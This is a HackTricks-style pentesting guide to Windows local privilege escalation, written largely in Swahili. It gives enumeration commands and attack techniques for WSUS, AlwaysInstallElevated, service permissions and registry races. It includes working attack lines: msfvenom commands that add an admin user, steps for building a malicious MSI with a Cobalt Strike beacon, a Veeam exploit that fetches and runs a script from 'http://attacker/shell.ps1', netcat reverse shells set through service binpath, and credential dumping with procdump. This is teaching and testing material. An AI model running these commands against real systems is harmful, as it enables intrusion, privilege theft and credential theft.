# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Zana bora zaidi ya kutafuta Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**Ikiwa hujui Windows Access Tokens ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa hujui integrity levels katika Windows unapaswa kusoma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Kuna mambo mbalimbali katika Windows ambayo yanaweza **kukuzuia kuorodhesha mfumo**, kuendesha executables au hata **kutambua shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na **kuorodhesha** mifumo hii yote ya **ulinzi** kabla ya kuanza enumeration ya privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes zilizoanzishwa kupitia `RAiLaunchAdminProcess` zinaweza kutumiwa vibaya kufikia High IL bila prompts wakati AppInfo secure-path checks zimepitwa. Angalia workflow mahususi ya bypass ya UIAccess/Admin Protection hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation inaweza kutumiwa vibaya kwa arbitrary SYSTEM registry write (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Windows builds za hivi karibuni pia zilianzisha njia ya **SMB arbitrary-port** LPE ambapo local NTLM authentication yenye privileged inareflectiwa kupitia reused SMB TCP connection:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Angalia kama Windows version ina vulnerability yoyote inayojulikana (angalia pia patches zilizowekwa).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) ni muhimu kwa kutafuta taarifa za kina kuhusu udhaifu wa usalama wa Microsoft. Hifadhidata hii ina zaidi ya udhaifu wa usalama 4,700, ikionyesha **massive attack surface** ambayo mazingira ya Windows yanatoa.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Any credential/Juicy info saved in the env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia ya PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Faili za PowerShell Transcript

Unaweza kujifunza jinsi ya kuiwasha hapa [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Uwekaji kumbukumbu wa Moduli ya PowerShell

Maelezo ya utekelezaji wa pipeline za PowerShell hurekodiwa, yakijumuisha amri zilizotekelezwa, uanzishaji wa amri, na sehemu za scripts. Hata hivyo, maelezo kamili ya utekelezaji na matokeo ya output huenda yasikamatwe.

Ili kuwezesha hili, fuata maagizo katika sehemu ya "Transcript files" ya documentation, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Ili kuona matukio 15 ya mwisho kutoka kwenye PowersShell logs unaweza kuendesha:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script inanaswa, kuhakikisha kwamba kila block ya code inaandikwa kadiri inavyoendeshwa. Mchakato huu huhifadhi trail ya audit ya kina kwa kila shughuli, ambayo ni muhimu kwa forensics na kuchambua tabia hasidi. Kwa kuandika shughuli zote wakati wa utekelezaji, maelezo ya kina kuhusu mchakato hutolewa.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Matukio ya logging kwa Script Block yanaweza kupatikana ndani ya Windows Event Viewer katika path: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya mwisho unaweza kutumia:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Mipangilio ya Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Hifadhi za
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Unaweza kuathiri mfumo ikiwa masasisho hayajaombwa kwa kutumia http**S** bali http.

Unaanza kwa kukagua ikiwa mtandao unatumia sasisho la WSUS lisilo la SSL kwa kuendesha yafuatayo katika cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Au pia hii katika PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ukipata jibu kama mojawapo ya haya:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Na kama `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Kisha, **inaweza kutumiwa vibaya.** Ikiwa registry ya mwisho ni sawa na 0, basi ingizo la WSUS litapuuzwa.

Ili kutumia vibaya vulnerabilities hivi unaweza kutumia tools kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Hizi ni MiTM weaponized exploits scripts za kuingiza 'fake' updates kwenye non-SSL WSUS traffic.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma report kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Kimsingi, hiki ndicho kasoro ambacho bug hii hutumia:

> Kama tuna uwezo wa kurekebisha local user proxy yetu, na Windows Updates hutumia proxy iliyosanidiwa katika settings za Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) locally ili kuingilia traffic yetu wenyewe na kuendesha code kama elevated user kwenye asset yetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS hutumia settings za current user, pia itatumia certificate store yake. Tukizalisha self-signed certificate kwa ajili ya WSUS hostname na kuongeza certificate hii kwenye certificate store ya current user, tutaweza kuingilia HTTP na HTTPS WSUS traffic zote mbili. WSUS haitumii mechanisms za aina ya HSTS ili kutekeleza trust-on-first-use type validation kwenye certificate. Ikiwa certificate iliyowasilishwa inatumiwa na user na ina hostname sahihi, itakubaliwa na service.

Unaweza kutumia vulnerabilities hii kwa kutumia tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (ikishakuwa liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Wakala wengi wa enterprise hufichua localhost IPC surface na privileged update channel. Ikiwa enrollment inaweza kulazimishwa kwenda kwa attacker server na updater inamuamini rogue root CA au weak signer checks, local user anaweza kuwasilisha malicious MSI ambayo SYSTEM service huiinstall. Tazama technique iliyojumlishwa (kulingana na Netskope stAgentSvc chain – CVE-2025-0309) hapa:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` hufichua localhost service kwenye **TCP/9401** inayochakata messages zinazodhibitiwa na attacker, ikiruhusu commands zozote kama **NT AUTHORITY\SYSTEM**.

- **Recon**: thibitisha listener na version, mfano, `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na required Veeam DLLs kwenye directory moja, kisha trigger payload ya SYSTEM kupitia local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Huduma hiyo hutekeleza amri kama SYSTEM.
## KrbRelayUp

Udhaifu wa **local privilege escalation** upo katika mazingira ya Windows **domain** chini ya masharti fulani. Masharti haya ni pamoja na mazingira ambapo **LDAP signing is not enforced,** watumiaji wana self-rights zinazoruhusu kuisanidi **Resource-Based Constrained Delegation (RBCD),** na uwezo wa watumiaji kuunda kompyuta ndani ya domain. Ni muhimu kutambua kwamba **requirements** hizi zinakidhiwa kwa kutumia **default settings**.

Pata **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa maelezo zaidi kuhusu mtiririko wa shambulio angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Kama** hizi registers 2 zimewashwa (thamani ni **0x1**), basi watumiaji wa aina yoyote ya privilege wanaweza **install** (execute) `*.msi` files kama NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ikiwa una kikao cha meterpreter unaweza kugeuza kiotomatiki mbinu hii kwa kutumia modu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri `Write-UserAddMSI` kutoka power-up kuunda ndani ya saraka ya sasa faili la MSI la Windows ili kuongeza haki. Skripti hii huandika kisakinishi cha MSI kilichokusanywa awali ambacho huomba uongezaji wa mtumiaji/kikundi (kwa hivyo utahitaji ufikivu wa GIU):
```
Write-UserAddMSI
```
Just execute the created binary to escalate privileges.

### MSI Wrapper

Soma mafunzo haya ili kujifunza jinsi ya kuunda MSI wrapper kwa kutumia zana hizi. Kumbuka kwamba unaweza ku-wrap "**.bat**" file ikiwa unataka tu **kutekeleza** **command lines**


{{#ref}}
msi-wrapper.md
{{endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na andika "installer" kwenye kisanduku cha utafutaji. Chagua mradi wa **Setup Wizard** na bofya **Next**.
- Ipe mradi jina, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kwa location, chagua **place solution and project in the same directory**, na bofya **Create**.
- Endelea kubofya **Next** hadi ufike hatua 3 kati ya 4 (choose files to include). Bofya **Add** na uchague Beacon payload uliyotengeneza hivi karibuni. Kisha bofya **Finish**.
- Angazia mradi wa **AlwaysPrivesc** katika **Solution Explorer** na katika **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
- Kuna other properties unaweza kubadilisha, kama **Author** na **Manufacturer** ambazo zinaweza kufanya app iliyosanikishwa ionekane halali zaidi.
- Bonyeza-kulia mradi na uchague **View > Custom Actions**.
- Bonyeza-kulia **Install** na uchague **Add Custom Action**.
- Bofya mara mbili kwenye **Application Folder**, chagua faili yako ya **beacon.exe** na bofya **OK**. Hii itahakikisha kwamba beacon payload inatekelezwa mara tu installer inapoendeshwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Mwishowe, **build it**.
- Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` linaonyeshwa, hakikisha umeweka platform kuwa x64.

### MSI Installation

Ili kutekeleza **installation** ya faili mbaya `.msi` katika **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Ili kutumia udhaifu huu unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Detectors

### Audit Settings

Mipangilio hii huamua ni nini kinachoandikwa kwenye **log**, kwa hiyo unapaswa kuzingatia
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, ni muhimu kujua ambapo logi zinatumwa
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za local Administrator**, ikihakikisha kwamba kila nywila ni **ya kipekee, ya kubahatisha, na husasishwa mara kwa mara** kwenye kompyuta zilizounganishwa kwenye domain. Nywila hizi huhifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji ambao wamepewa ruhusa za kutosha kupitia ACLs, hivyo kuwaruhusu kuona local admin passwords ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewashwa, **plain-text passwords huhifadhiwa katika LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Ulinzi wa LSA

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioimarishwa kwa Local Security Authority (LSA) ili **kuzuia** majaribio ya michakato isiyoaminika ya **kusoma kumbukumbu yake** au kuingiza code, hivyo kuilinda zaidi system.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Kusudi lake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama mashambulizi ya pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Hati za Akiba za Kuingia

**Domain credentials** huthibitishwa na **Local Security Authority** (LSA) na hutumiwa na vipengele vya mfumo wa uendeshaji. Wakati data ya kuingia ya mtumiaji inathibitishwa na security package iliyosajiliwa, domain credentials za mtumiaji kwa kawaida huanzishwa.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Watumiaji & Vikundi

### Orodhesha Watumiaji & Vikundi

Unapaswa kuangalia ikiwa kundi lolote ambapo wewe ni mwanachama lina ruhusa za kuvutia
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Vikundi vya ruhusa ya juu

Ikiwa **unamiliki kundi fulani lenye ruhusa ya juu unaweza kuweza kuongeza ruhusa**. Jifunze kuhusu vikundi vyenye ruhusa ya juu na jinsi ya kuvinyanyasa ili kuongeza ruhusa hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Udanganyifu wa token

**Jifunze zaidi** kuhusu token ni nini katika ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **kujifunza kuhusu token zinazovutia** na jinsi ya kuzininyanyasa:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Vikao
```bash
qwinsta
klist sessions
```
### Folda za nyumbani
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Sera ya Nenosiri
```bash
net accounts
```
### Pata yaliyomo ya clipboard
```bash
powershell -command "Get-Clipboard"
```
## Mchakato Unaoendelea

### Ruhusa za Faili na Folda

Kwanza kabisa, ukiorodhesha michakato **angalia kama kuna nenosiri ndani ya command line ya mchakato**.\
Angalia kama unaweza **ku-overwrite binary fulani inayorun** au kama una ruhusa za kuandika kwenye folda ya binary ili ku-exploit uwezekano wa [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Kila mara angalia kama kuna [**electron/cef/chromium debuggers** zinaendelea kufanya kazi, unaweza kuzitumia vibaya ili kuinua ruhusa](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kuangalia ruhusa za binaries za michakato**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kuangalia ruhusa za folda za binaries za processes (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Uchimbaji wa Password kutoka Memory

Unaweza kuunda memory dump ya mchakato unaoendelea kwa kutumia **procdump** kutoka sysinternals. Huduma kama FTP huwa na **credentials katika clear text ndani ya memory**, jaribu kutoa memory dump na kusoma credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### App za GUI zisizo salama

**Programu zinazokimbia kama SYSTEM zinaweza kumruhusu mtumiaji kuzindua CMD, au kuvinjari directories.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bofya "Click to open Command Prompt"

## Services

Service Triggers huruhusu Windows kuanzisha service wakati hali fulani zinapotokea (shughuli za named pipe/RPC endpoint, matukio ya ETW, upatikanaji wa IP, kuwasili kwa device, GPO refresh, n.k.). Hata bila haki za SERVICE_START mara nyingi unaweza kuanzisha services zenye privilege kwa kuwasha triggers zake. Tazama enumeration na activation techniques hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

Pata orodha ya services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Ruhusa

Unaweza kutumia **sc** kupata taarifa za service.
```bash
sc qc <service_name>
```
Inapendekezwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha priviliji kinachohitajika kwa kila service.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Inapendekezwa kuangalia kama "Authenticated Users" wanaweza kurekebisha huduma yoyote:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Unaweza kupakua accesschk.exe ya XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Wezesha service

Ikiwa unapata kosa hili (kwa mfano na SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Unaweza kuiwezesha kwa kutumia
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Zingatia kwamba huduma upnphost inategemea SSDPSRV ili kufanya kazi (kwa XP SP1)**

**Njia nyingine ya kuzunguka** tatizo hili ni kuendesha:
```
sc.exe config usosvc start= auto
```
### **Badilisha njia ya service binary**

Katika hali ambapo kundi la "Authenticated users" linamiliki **SERVICE_ALL_ACCESS** kwenye service, inawezekana kubadilisha executable binary ya service. Ili kubadilisha na kuendesha **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Anzisha upya huduma
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Haki zinaweza kuinuliwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Inaruhusu kusanidi upya binary ya huduma.
- **WRITE_DAC**: Huwezesha kusanidi upya ruhusa, na kusababisha uwezo wa kubadilisha usanidi wa huduma.
- **WRITE_OWNER**: Inaruhusu kuchukua umiliki na kusanidi upya ruhusa.
- **GENERIC_WRITE**: Huirithi uwezo wa kubadilisha usanidi wa huduma.
- **GENERIC_ALL**: Pia huirithi uwezo wa kubadilisha usanidi wa huduma.

Kwa kugundua na kutumia udhaifu huu, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Services binaries weak permissions

**Angalia kama unaweza kurekebisha binary inayotekelezwa na service** au kama una **write permissions kwenye folda** ambamo binary hiyo iko ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayotekelezwa na service kwa kutumia **wmic** (sio katika system32) na kukagua ruhusa zako kwa kutumia **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Unaweza pia kutumia **sc** na **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Ruhusa za kurekebisha registry za huduma

Unapaswa kuangalia kama unaweza kurekebisha yoyote registry ya huduma.\
Unaweza **kuangalia** **ruhusa** zako juu ya registry ya huduma kwa kufanya:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Inapaswa kuangaliwa kama **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana `FullControl` permissions. Ikiwa ndivyo, binary inayotekelezwa na service inaweza kubadilishwa.

Ili kubadilisha Path ya binary inayotekelezwa:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Beberapa vipengele vya Windows Accessibility huunda funguo za per-user **ATConfig** ambazo baadaye hunakiliwa na mchakato wa **SYSTEM** kwenda kwenye funguo ya session ya HKLM. **Symbolic link race** ya registry inaweza kuelekeza uandishi huo wenye privilege kwenda **njia yoyote ya HKLM**, ikikupa primitive ya **arbitrary HKLM value write**.

Sehemu muhimu za funguo (mfano: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` huorodhesha vipengele vya accessibility vilivyosakinishwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` huhifadhi configuration inayodhibitiwa na mtumiaji.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` huundwa wakati wa logon/secure-desktop transitions na inaweza kuandikwa na mtumiaji.

Mtiririko wa matumizi mabaya (CVE-2026-24291 / ATConfig):

1. Jaza value ya **HKCU ATConfig** unayotaka iandikwe na SYSTEM.
2. Anzisha secure-desktop copy (kwa mfano, **LockWorkstation**), ambayo huanzisha mtiririko wa AT broker.
3. **Shinda race** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; oplock inapochochewa, badilisha key ya **HKLM Session ATConfig** na **registry link** kuelekea protected HKLM target.
4. SYSTEM huandika value iliyochaguliwa na mshambuliaji kwenye njia ya HKLM iliyogeuzwa.

Mara tu unapopata arbitrary HKLM value write, panda kwenda LPE kwa ku-overwrite thamani za configuration za service:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua service ambayo mtumiaji wa kawaida anaweza kuanzisha (kwa mfano, **`msiserver`**) na i-trigger baada ya uandishi. **Kumbuka:** public exploit implementation **hu-lock workstation** kama sehemu ya race.

Mfano wa tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Ruhusa za Services registry AppendData/AddSubdirectory

Kama una ruhusa hii juu ya registry, hii ina maana **unaweza kuunda sub registries kutoka hii moja**. Katika hali ya Windows services, hii **inatosha kutekeleza arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Kama path ya executable haiko ndani ya quotes, Windows itajaribu kutekeleza kila sehemu ya mwisho kabla ya space.

